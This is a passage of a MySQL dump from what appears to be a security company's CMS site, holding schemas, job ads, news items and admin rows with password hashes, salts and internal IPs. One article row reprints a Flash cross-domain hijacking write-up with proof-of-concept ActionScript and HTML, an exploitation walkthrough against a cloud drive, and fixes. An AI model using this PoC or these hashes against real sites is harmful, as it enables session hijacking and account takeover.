  `cid` int(11) DEFAULT NULL COMMENT '对应的内容ID',
  `title` varchar(255) DEFAULT NULL COMMENT '内容标题',
  `content` text COMMENT '具体内容',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=15 DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_soft 
DROP TABLE IF EXISTS `xyh_soft`;
CREATE TABLE `xyh_soft` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(100) NOT NULL DEFAULT '' COMMENT '标题',
  `color` char(10) NOT NULL DEFAULT '' COMMENT '标题颜色',
  `keywords` varchar(50) DEFAULT '' COMMENT '关键字',
  `litpic` varchar(150) NOT NULL DEFAULT '' COMMENT '缩略图',
  `pictureurls` text,
  `content` text COMMENT '内容',
  `updatelog` text COMMENT '更新日志',
  `downlink` text COMMENT '下载地址',
  `description` varchar(255) NOT NULL DEFAULT '' COMMENT '摘要描述',
  `version` varchar(20) NOT NULL DEFAULT '' COMMENT '版本号',
  `softtype` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '软件类型',
  `copytype` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '授权形式',
  `language` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '语言',
  `os` varchar(100) NOT NULL DEFAULT '' COMMENT '运行环境',
  `filesize` varchar(10) NOT NULL DEFAULT '' COMMENT '文件大小',
  `officialurl` varchar(100) NOT NULL DEFAULT '' COMMENT '官方网站',
  `publishtime` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '发布时间',
  `updatetime` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间',
  `click` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '点击数',
  `cid` int(10) unsigned NOT NULL COMMENT '分类ID',
  `commentflag` tinyint(1) NOT NULL DEFAULT '1' COMMENT '允许评论',
  `flag` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '属性',
  `jumpurl` varchar(200) NOT NULL DEFAULT '',
  `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '1回收站',
  `userid` int(10) unsigned NOT NULL DEFAULT '0',
  `aid` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'admin',
  PRIMARY KEY (`id`),
  KEY `cid` (`cid`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_special 
DROP TABLE IF EXISTS `xyh_special`;
CREATE TABLE `xyh_special` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(100) NOT NULL DEFAULT '',
  `shorttitle` varchar(100) NOT NULL DEFAULT '' COMMENT '副标题',
  `color` char(10) NOT NULL DEFAULT '',
  `author` varchar(30) NOT NULL DEFAULT '',
  `keywords` varchar(50) DEFAULT '' COMMENT '关键字',
  `litpic` varchar(150) NOT NULL DEFAULT '' COMMENT '缩略图',
  `description` varchar(255) NOT NULL DEFAULT '',
  `content` text COMMENT '内容',
  `publishtime` int(10) unsigned NOT NULL DEFAULT '0',
  `updatetime` int(10) unsigned NOT NULL DEFAULT '0',
  `click` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '点击数',
  `cid` int(10) unsigned NOT NULL COMMENT '分类ID',
  `commentflag` tinyint(1) NOT NULL DEFAULT '1' COMMENT '允许评论',
  `flag` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '属性',
  `jumpurl` varchar(200) NOT NULL DEFAULT '',
  `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '1回收站',
  `filename` varchar(60) DEFAULT '',
  `template` varchar(60) NOT NULL DEFAULT '',
  `aid` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'admin',
  PRIMARY KEY (`id`),
  KEY `cid` (`cid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 ;



# 转存表中的数据：xyh_access 
INSERT INTO `xyh_access` VALUES ('1','54','3','');
INSERT INTO `xyh_access` VALUES ('1','53','3','');
INSERT INTO `xyh_access` VALUES ('1','52','3','');
INSERT INTO `xyh_access` VALUES ('1','51','2','');
INSERT INTO `xyh_access` VALUES ('1','50','3','');
INSERT INTO `xyh_access` VALUES ('1','49','3','');
INSERT INTO `xyh_access` VALUES ('1','48','3','');
INSERT INTO `xyh_access` VALUES ('1','47','3','');
INSERT INTO `xyh_access` VALUES ('1','46','2','');
INSERT INTO `xyh_access` VALUES ('1','45','3','');
INSERT INTO `xyh_access` VALUES ('1','44','3','');
INSERT INTO `xyh_access` VALUES ('1','43','3','');
INSERT INTO `xyh_access` VALUES ('1','42','3','');
INSERT INTO `xyh_access` VALUES ('1','41','2','');
INSERT INTO `xyh_access` VALUES ('1','40','3','');
INSERT INTO `xyh_access` VALUES ('1','39','3','');
INSERT INTO `xyh_access` VALUES ('1','38','3','');
INSERT INTO `xyh_access` VALUES ('1','37','3','');
INSERT INTO `xyh_access` VALUES ('1','36','2','');
INSERT INTO `xyh_access` VALUES ('1','35','3','');
INSERT INTO `xyh_access` VALUES ('1','34','3','');
INSERT INTO `xyh_access` VALUES ('1','33','3','');
INSERT INTO `xyh_access` VALUES ('1','32','3','');
INSERT INTO `xyh_access` VALUES ('1','31','2','');
INSERT INTO `xyh_access` VALUES ('1','30','3','');
INSERT INTO `xyh_access` VALUES ('1','29','3','');
INSERT INTO `xyh_access` VALUES ('1','28','3','');
INSERT INTO `xyh_access` VALUES ('1','27','3','');
INSERT INTO `xyh_access` VALUES ('1','26','3','');
INSERT INTO `xyh_access` VALUES ('1','25','2','');
INSERT INTO `xyh_access` VALUES ('1','24','3','');
INSERT INTO `xyh_access` VALUES ('1','23','3','');
INSERT INTO `xyh_access` VALUES ('1','22','3','');
INSERT INTO `xyh_access` VALUES ('1','21','3','');
INSERT INTO `xyh_access` VALUES ('1','20','3','');
INSERT INTO `xyh_access` VALUES ('1','19','2','');
INSERT INTO `xyh_access` VALUES ('1','55','3','');
INSERT INTO `xyh_access` VALUES ('1','18','3','');
INSERT INTO `xyh_access` VALUES ('1','17','2','');
INSERT INTO `xyh_access` VALUES ('1','12','3','');
INSERT INTO `xyh_access` VALUES ('1','11','3','');
INSERT INTO `xyh_access` VALUES ('1','10','3','');
INSERT INTO `xyh_access` VALUES ('1','9','3','');
INSERT INTO `xyh_access` VALUES ('1','8','3','');
INSERT INTO `xyh_access` VALUES ('1','6','3','');
INSERT INTO `xyh_access` VALUES ('1','5','3','');
INSERT INTO `xyh_access` VALUES ('1','4','3','');
INSERT INTO `xyh_access` VALUES ('1','3','3','');
INSERT INTO `xyh_access` VALUES ('1','2','2','');
INSERT INTO `xyh_access` VALUES ('1','1','1','');
INSERT INTO `xyh_access` VALUES ('4','103','3','');
INSERT INTO `xyh_access` VALUES ('4','102','3','');
INSERT INTO `xyh_access` VALUES ('4','101','2','');
INSERT INTO `xyh_access` VALUES ('4','26','3','');
INSERT INTO `xyh_access` VALUES ('4','25','2','');
INSERT INTO `xyh_access` VALUES ('4','55','3','');
INSERT INTO `xyh_access` VALUES ('4','17','2','');
INSERT INTO `xyh_access` VALUES ('4','1','1','');
INSERT INTO `xyh_access` VALUES ('4','104','3','');
INSERT INTO `xyh_access` VALUES ('4','105','3','');
INSERT INTO `xyh_access` VALUES ('1','133','2','');
INSERT INTO `xyh_access` VALUES ('1','134','3','');


# 转存表中的数据：xyh_admin 
INSERT INTO `xyh_admin` VALUES ('1','admin','7c9b93ede4b2139b404df71737b08802','1AbpYC','','','9','1499069567','10.4.8.220','0');
INSERT INTO `xyh_admin` VALUES ('3','admin2','d31f2485b9773b18777c455d19304e16','6jIyKJ','','','0','1499049936','10.4.8.99','0');


# 转存表中的数据：xyh_article 
INSERT INTO `xyh_article` VALUES ('18','高级安全顾问 2 名','','','','','','','<p>岗位职责</p><p>从事专业信息安全咨询和服务工作，包括风险评估，安全体系设计，安全策略与制度设计，安全培训等；</p><p>从事行业用户安全解决方案设计及项目管理工作；</p><p>任职要求</p><p>热衷于信息安全相关工作，有强烈的责任心和工作热情；</p><p>具有良好的沟通能力和书面表达能力，具有良好的团队协作精神；</p><p>熟悉主流安全技术，熟悉国内外主流安全产品，有大型信息安全项目或安全集成从业背景；</p><p>熟悉ISO27001，17799，国家信息安全等级保护等标准，熟悉企业信息安全策略和安全体系结构；&nbsp;</p><p>三年以上信息安全相关工作经验，有信息系统风险评估项目或IT咨询实施经验；</p><p>有CISSP，CISP、BS7799LA等相关证书者优先；</p><p><br/></p>','岗位职责从事专业信息安全咨询和服务工作，包括风险评估，安全体系设计，安全策略与制度设计，安全培训等；从事行业用户安全解决方案设计及项目管理工作；任职要求热衷于信息安全相关工作，有强烈的责任心和工作热情；具有良好的沟通能力和书面表达能力，具有','1492505850','1498705385','56','58','1','0','','1','0','1');
INSERT INTO `xyh_article` VALUES ('19','安全顾问 3名','','','','','','','<p>岗位职责</p><p>对于相关技术领域进行安全服务实施并完成实施报告；</p><p>对专项安全解决方案进行技术支持。</p><p>任职要求</p><p>热衷于信息安全领域工作，较强的动手能力；</p><p>对Windows、Unix、SQL Server、Oracle等系统有较深入的了解，熟悉TCP/IP协议、漏洞扫描、网络攻防等</p><p>良好的沟通能力和书面表达能力，能够完成客户培训和评估报告；</p><p>敬业、正直、诚实，有强烈的责任心和工作热情；</p><p>计算机及相关专业本科以上学历；</p><p>获得CISSP,CISP,CCNP等相关认证证书，有实践经验者优先。</p><p><br/></p>','岗位职责对于相关技术领域进行安全服务实施并完成实施报告；对专项安全解决方案进行技术支持。任职要求热衷于信息安全领域工作，较强的动手能力；对Windows、Unix、SQL Server、Oracle等系统有较深入的了解，熟悉TCP/IP协议','1492505916','1498705400','123','58','1','0','','1','0','1');
INSERT INTO `xyh_article` VALUES ('67','服务市场经理1人','','','','','','','<p><strong><img src=\"/uploads/img1/20170701/59571d5512d8c.png\" title=\"59571d5512d8c.png\" alt=\"zarror.png\"/> 职位描述</strong></p><p>良好的市场开发和人际交流能力；<br/>设计服务的营销策略和推广实施方案，并负责实施；<br/>和销售人员，安全服务人员开展沟通，及时了解服务市场需求变化，并提出服务产品设计的改进建议；&nbsp;<br/>对重点客户，行业客户以及政府相关部门进行公共关系维护，及时了解市场需求；<br/>开展对销售人员的服务产品销售培训。<br/><strong><strong style=\"white-space: normal;\"><img src=\"/uploads/img1/20170701/59571d5512d8c.png\" title=\"59571d5512d8c.png\" alt=\"zarror.png\"/></strong> 人员资格要求：</strong><br/>本科以上学历，计算机及相关专业；<br/>1年以上市场营销工作经验，熟悉信息安全市场；<br/>优秀的口头和书面表达能力，策划及执行能力突出；<br/>有责任心具备工作协调能力和团队合作精神；</p><p><strong style=\"white-space: normal;\"><strong><img src=\"/uploads/img1/20170701/59571d5512d8c.png\" title=\"59571d5512d8c.png\" alt=\"zarror.png\"/>&nbsp;</strong></strong><strong>联系方式</strong>&nbsp;</p><p>联系地址：福州市北环中路61号海峡信息大楼2F</p><p>联系电话：0591-87303710</p><p>联 系 人：张先生</p><p>电子邮箱：hxzhb@heidun.net</p>','职位描述良好的市场开发和人际交流能力；设计服务的营销策略和推广实施方案，并负责实施；和销售人员，安全服务人员开展沟通，及时了解服务市场需求变化，并提出服务产品设计的改进建议； 对重点客户，行业客户以及政府相关部门进行公共关系维护，','1498705499','1498891556','41','58','1','0','','0','0','1');
INSERT INTO `xyh_article` VALUES ('59','Flash跨域数据劫持漏洞，一大波网站受影响','','','','','','/uploads/img1/20170426/58fff7a1ab029.jpg!300X300.jpg','<p style=\"text-indent: 2em;\">原文：http://www.pnigos.com/?p=310</p><p style=\"text-indent: 2em;\">0×01，背景</p><p style=\"text-indent: 2em;\">很多上传文件的后端逻辑在实现时，仅仅验证了文件后缀名和Content-Type，没有对上传文件的内容进行验证。通常情况下这样的处理逻辑仅仅是不严谨，不会造成太大的安全隐患。但经过笔者测试，发现object标签在包含flash文件时没有对嵌入的文件后缀进行判断。也就是说，只要文件内容包含了正常的flash文件代码，就能够被object标签成功加载并执行。而ActionScript中又提供了多种API能够让Flash发送网络请求。这样如果能够将任意后缀的Flash文件上传到目标域中，就能够在攻击者可控的域下让受害者访问一个精心构造的恶意页面，来对目标域进行跨域的数据劫持，获取受害者当前Session下的CSRF Token，以受害者的身份打开目标域的任何特权页面，进行特权操作。</p><p style=\"text-indent: 2em;\">0×02，利用条件</p><pre>1，&nbsp;&nbsp;目标网站的文件上传逻辑没有验证文件内容；\r\n2，&nbsp;&nbsp;上传的文件没有做域隔离处理；\r\n3，&nbsp;&nbsp;服务端没有强制设置Content-Disposition响应头；\r\n4，&nbsp;&nbsp;访问上传的文件没有session限制；</pre><p>&nbsp;</p><p style=\"text-indent: 2em;\">0×03，攻击场景构造：</p><p style=\"text-indent: 2em;\">首先需要构造一个poc swf文件能够对外发送http请求，这里只做演示用，因此只实现了发送简单的GET请求，代码如下：</p><pre class=\"brush:css;toolbar:false\">importflash.net.URLLoader;\r\nimportflash.net.URLRequest;\r\nimportflash.net.URLLoaderDataFormat;\r\nimportflash.net.URLVariables;\r\nimportflash.events.Event;\r\nimportflash.events.HTTPStatusEvent;\r\nimportflash.events.IOErrorEvent;\r\nimportflash.events.ProgressEvent;\r\nimportflash.events.SecurityErrorEvent;\r\nimportflash.display.LoaderInfo;\r\nimportflash.system.Security;\r\nSecurity.allowDomain(&quot;*&quot;);\r\nvarurlObj:Object&nbsp;=&nbsp;LoaderInfo(this.root.loaderInfo).parameters.url;\r\nvarrequest:URLRequest&nbsp;=&nbsp;new&nbsp;URLRequest(urlObj.toString());\r\nrequest.method=&nbsp;URLRequestMethod.GET;\r\n&nbsp;\r\nvarloader:URLLoader&nbsp;=&nbsp;new&nbsp;URLLoader();\r\nitemScroll.x=&nbsp;response.x+response.width;\r\nitemScroll.y=&nbsp;response.y;\r\nitemScroll.height=&nbsp;response.height;\r\n&nbsp;\r\nloader.dataFormat=&nbsp;URLLoaderDataFormat.TEXT;\r\nloader.addEventListener(Event.COMPLETE,loader_complete);\r\nloader.load(request);\r\n&nbsp;\r\nfunctionloader_complete&nbsp;(e:Event):void&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;trace(&quot;Event.COMPLETE&quot;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;trace(&quot;Resp&nbsp;Data&nbsp;:\\n&quot;&nbsp;+&nbsp;loader.data);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response.text&nbsp;=&nbsp;loader.data;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;itemScroll.scrollTarget&nbsp;=&nbsp;response;\r\n}</pre><p style=\"text-indent: 2em;\">首先使用了LoaderInfo(this.root.loaderInfo)从object标签的flashVars参数中提取出要访问的URL，再使用URLLoader对该URL发送GET请求，响应结果回显到一个Text控件中，用作验证。</p><p>接下来构造一个页面用于包含swf文件，代码如下：</p><pre class=\"brush:html;toolbar:false\">&lt;html&gt;\r\n&lt;head&gt;\r\n&lt;title&gt;FlashCSRF&nbsp;POC&nbsp;by&nbsp;pnig0s@FreeBuf&lt;/title&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;h2&gt;FlashCSRF&nbsp;POC&nbsp;by&nbsp;pnig0s@FreeBuf&lt;/h2&gt;\r\n&lt;div&gt;\r\nswf&nbsp;url：&lt;inputtype=&quot;text&quot;&nbsp;id=&quot;swfurl&quot;&nbsp;style=&quot;width:500&quot;&gt;&lt;/br&gt;\r\nhijackurl：&lt;input&nbsp;type=&quot;text&quot;&nbsp;id=&quot;csrfurl&quot;style=&quot;width:&nbsp;500&quot;&gt;&lt;/br&gt;\r\n&lt;inputtype=&quot;button&quot;&nbsp;value=&quot;submit&quot;&nbsp;id=&quot;submit&quot;&gt;\r\n&lt;/div&gt;\r\n&lt;iframename=&quot;swf&quot;&nbsp;style=&quot;width:1000;height:1000&quot;&gt;&lt;/iframe&gt;\r\n&lt;script&gt;\r\nfunctionwriteflashobject(url,parastr)&nbsp;{\r\nswf&nbsp;=window.frames[&quot;swf&quot;];\r\nswf.document.write(&quot;&lt;objectclassid=\\&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\\&quot;codebase=\\&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0\\&quot;width=\\&quot;1000\\&quot;&nbsp;height=\\&quot;1000\\&quot;&nbsp;id=\\&quot;FlashVars\\&quot;align=\\&quot;middle\\&quot;\\&gt;\\n&quot;);\r\nswf.document.write(&quot;&lt;paramname=\\&quot;allowScriptAccess\\&quot;&nbsp;value=\\&quot;always\\&quot;/\\&gt;\\n&quot;);\r\nswf.document.write(&quot;&lt;paramname=\\&quot;movie\\&quot;&nbsp;value=\\&quot;FlashVars.swf\\&quot;&nbsp;/\\&gt;\\n&quot;);\r\nswf.document.write(&quot;&lt;paramname=\\&quot;FlashVars\\&quot;&nbsp;value=\\&quot;&quot;+&nbsp;parastr&nbsp;+&quot;\\&quot;/\\&gt;\\n&quot;);\r\nswf.document.write(&quot;&lt;paramname=\\&quot;quality\\&quot;&nbsp;value=\\&quot;high\\&quot;&nbsp;/\\&gt;\\n&quot;);\r\nswf.document.write(&quot;&lt;paramname=\\&quot;bgcolor\\&quot;&nbsp;value=\\&quot;#ffffff\\&quot;&nbsp;/\\&gt;\\n&quot;);\r\nswf.document.write(&quot;&lt;embedsrc=\\&quot;&quot;+url+&quot;\\&quot;&nbsp;quality=\\&quot;high\\&quot;bgcolor=\\&quot;#ffffff\\&quot;&nbsp;width=\\&quot;550\\&quot;&nbsp;height=\\&quot;400\\&quot;name=\\&quot;FlashVars\\&quot;&nbsp;align=\\&quot;middle\\&quot;&nbsp;allowScriptAccess=\\&quot;always\\&quot;FlashVars=\\&quot;&quot;+&nbsp;parastr&nbsp;+&quot;\\&quot;type=\\&quot;application/x-shockwave-flash\\&quot;&nbsp;pluginspage=\\&quot;http://www.macromedia.com/go/getflashplayer\\&quot;/\\&gt;&quot;);\r\nswf.document.write(&quot;&lt;/object\\&gt;&quot;);\r\n}\r\nfunction&nbsp;get&nbsp;(name)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;query&nbsp;=window.location.search.substring(1);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;pairs&nbsp;=query.split(&quot;&amp;&quot;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(var&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&lt;pairs.length;&nbsp;i++)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;pos=pairs[i].indexOf(&#39;=&#39;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(pos&nbsp;==-1)continue;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;argname&nbsp;=pairs[i].substring(0,pos);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;value&nbsp;=pairs[i].substring(pos+1);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(argname&nbsp;==&nbsp;name){return&nbsp;value;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;};\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\nvar&nbsp;submit&nbsp;=&nbsp;document.getElementById(&quot;submit&quot;);\r\nsubmit.addEventListener(&quot;click&quot;,function()&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;swfurl&nbsp;=document.getElementById(&quot;swfurl&quot;).value;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;param&nbsp;=&quot;url=&quot;+document.getElementById(&quot;csrfurl&quot;).value;//&quot;url=&quot;+get(&quot;csrfurl&quot;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;writeflashobject(swfurl,param);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;false;\r\n});\r\n&lt;/script&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;</pre><p>最终的效果如图：<br/></p><p style=\"text-align:center\"><img alt=\"\" src=\"http://www.si.net.cn/Upimg/20149301176913.jpg\" width=\"690\" height=\"559\"/></p><p>0×03，漏洞利用</p><p style=\"text-align: left; text-indent: 2em;\">这里以某知名厂商提供的云盘服务进行测试，演示该漏洞的利用过程。访问该云盘服务的文件上传页面。</p><p style=\"text-align: center;\"><img alt=\"\" src=\"/uploads/img1/20170627/5951ad24143ce.jpg\" width=\"560\" height=\"454\"/></p><p style=\"text-indent: 2em;\">将之前写好的swf文件后缀修改为jpg并上传，服务端没有检查文件内容，文件上传成功。</p><p style=\"text-indent: 2em;\">将该文件设置成共享状态，这一步是为了让最终的文件访问链接摆脱session状态的限制，能够被其他任何用户访问到。</p><p style=\"text-indent: 2em;\">最终在图片预览状态通过Chrome的DeveloperTool找到图片的直接访问链接。形如</p><pre class=\"brush:html;toolbar:false\">http://foo.com/intf.php?method=Preview.outputPic&amp;xid=178xxx535&amp;fname=%2Freq.jpg&amp;fhash=f9cefd7e900xxxxxx6d47cd5909796e1b9&amp;dt=24.01xxxxxxd8c91c6fefad848&amp;v=1.0.1&amp;rtick=14008172544583&amp;open_app_id=0&amp;devtype=web&amp;sign=8895bd6844bxxxxxx15e42a8b&amp;</pre><p style=\"text-indent: 2em;\">通过之前构造的html页面，使用object包含上面的链接，swf文件能够被正常的执行，当其他用户访问该页面，会以该用户的身份打开指定的页面，造成跨域数据劫持，此时Anti-CSRF已经形同虚设，可以获取CSRF Token，访问特权页面，进行特权操作。<br/><br/></p><p style=\"text-align:center\"><img alt=\"\" src=\"/uploads/img1/20170627/5951ad255bfe3.jpg\" width=\"690\" height=\"299\"/></p><p>&nbsp;</p><p>0×04，影响范围</p><p style=\"text-indent: 2em;\">经过笔者测试，国内各知名互联网厂商，及云存储提供商均受到该问题的影响。除此之外，经过测试，一些知名的开源在线编辑器如UEditor，CKEditor，KindEditor，XhEditor，Ewebeditor等也均受到该问题的影响。更多其他厂商及Web应用暂未做更多测试，不过可以预见受该问题影响的站点数量较多。</p><p>0×05，修复建议</p><p>根据之前提到过的利用条件，修复的方法也就显而易见了。</p><p style=\"text-indent: 0em;\">1，对上传文件内容进行检查：<br/>当然这并不容易，除了jpg类型，能够直接在线访问的文件类型很多，尤其对于云存储服务，以及有些服务功能性上的需要，难以全部进行验证。<br/>2，强制设置Content-Disposition响应头：<br/>设置该头部后能够强制浏览器对文件执行下载操作。但是对国内一些服务测试的过程中也发现了一个问题，有些直接在URL中加了类似downloadtype=1这类参数，直接设置成0就不会强制下载了。所以建议这种参数不要暴露在url中。<br/>3，进行域隔离：<br/>这个没什么好说的，尤其对于一些云盘，云存储的服务，对于用户上传的文件不做域隔离的都是耍流氓的行为。</p><p>&nbsp;</p><p>0×06，结束</p><p>行文仓促，谢绝PK。</p><p>0×07，REF</p><p>1)http://blog.detectify.com/post/86298380233/the-pitfalls-of-allowing-file-uploads-on-your-website</p><p>2)http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/URLLoader.html</p><p><br/>&nbsp;</p><p><br/></p>','很多上传文件的后端逻辑在实现时，仅仅验证了文件后缀名和Content-Type，没有对上传文件的内容进行验证。通常情况下这样的处理逻辑仅仅是不严谨，不会造成太大的安全隐患。但经过笔者测试，发现object标签在包含flash文件时没有对嵌入的文件后缀进行判断。也就是说，只要文件内容包含了正常的flash文件代码，就能够被object标签成功加载并执行。而ActionScript中又提供了多种API能够让Flash发送网络请求。这样如果能够将任意后缀的Flash文件上传到目标域中，就能够在攻击者可控的域下让','1493170031','1498525003','104','41','1','1','','0','0','1');
INSERT INTO `xyh_article` VALUES ('62','公司应邀参加“重要信息系统网络安全保障和应急处置工作研讨会”','','','','','','','<p style=\"text-indent: 2em;\">2016年6月25号，由福建省网络与信息安全协调小组办公室、福建省网络与信息安全信息通报中心主办，福建省海峡信息技术有限公司协办的“重要信息系统网络安全保障和应急处置工作研讨会”在福州永泰隆重召开，省公安厅网安总队总队长林乐坚、副总队长潘圣源，福建省网络与信息安全测评中心总工程师康仲生，福州市公安局副局长黄作璋等领导以及20多家省直单位信息中心负责人参加，会议围绕“网络安全保障和应急处置”主题，应对我省面临的复杂网络安全形势，积极探讨如何加强我省关键基础设施和重要信息系统安全保障建设，深入推动网络安全事件通报应急处置工作的开展。</p><p style=\"text-indent: 2em;\">海峡信息作为技术支撑单位应邀在会上作了关于“网络安全应急及保障建设”的经验分享，介绍了海峡信息作为省网安办技术支撑单位所作的卓越贡献，回顾了自02年起接手处置的上百起网络安全应急事件，以及针对不同等级事件而创建的应急相应处置体系，为客户提供一站式等级保护建设服务；另外，会议上也推出的基于国产芯片的黑盾系列网络安全设备和适用于云计算平台虚拟化环境下部署的云化黑盾系列安全设备。</p><p style=\"text-indent: 2em;\">未来已来，海峡信息将不断夯实研发技术实力和服务体系建设，一如既往的为客户提供一流服务！</p><p><br/></p>','2016年6月25号，由福建省网络与信息安全协调小组办公室、福建省网络与信息安全信息通报中心主办，福建省海峡信息技术有限公司协办的“重要信息系统网络安全保障和应急处置工作研讨会”在福州永泰隆重召开，省公安厅网安总队总队长林乐坚、副总队长潘圣源，福建省网络与信息安全测评中心总工程师康仲生，福州市公安局副局长黄作璋等领导以及20多家省直单位信息中心负责人参加，会议围绕“网络安全保障和应急处置”主题，应对我省面临的复杂网络安全形势，积极探讨如何加强我省关键基础设施和重要信息系统安全保障建设，深入推动网络安全事件','1496300270','1498523786','70','18','1','0','','0','0','1');
INSERT INTO `xyh_article` VALUES ('63','海峡信息助力漳州市医院顺利通过等级保护三级测评','','','','','','/uploads/img1/20170622/594b38355271a.jpg!300X300.jpg','<p style=\"white-space: normal; text-indent: 2em;\">近期，福建省海峡信息助力漳州市医院，帮助其顺利通过等级保护三级测评，成为漳州市医疗行业之中首家通过等级保护三级测评的机构。</p><p style=\"white-space: normal; text-indent: 2em;\">海峡信息助力漳州市医院漳州市医院信息系统等级保护（三级）项目依始，海峡信息成立项目组，组织安全专家团队依据国家标准GB/T 22239-2008《信息系统安全等级保护基本要求》、《卫生部办公厅关于全面开展卫生行业信息安全等级保护工作的通知》、《福建省医院信息系统安全等级保护工作实施方案》《福建省卫计委办公室关于进一步落实信息系统安全防护措施的通知》等相关文件对漳州市医院进行完整而详细的安全改造及风险评估、规范及落地信息安全制度、协助漳州市医院构建信息安全保障体系。经过为期两个月的改造规划，于2016年2月协助漳州市医院完成省网络与信息安全测评中心的测评，测评覆盖漳州市医院信息系统（HIS）、医疗影像系统（PACS）、电子病历系统（EMR）、检验系统（LIS）等四大系统所涉及的物理安全、网络安全、主机安全、应用安全、数据安全以及安全管理等10大领域77类近300个控制项的内容；测评周期近2周，最终，顺利通过三级测评。</p><p style=\"white-space: normal; text-indent: 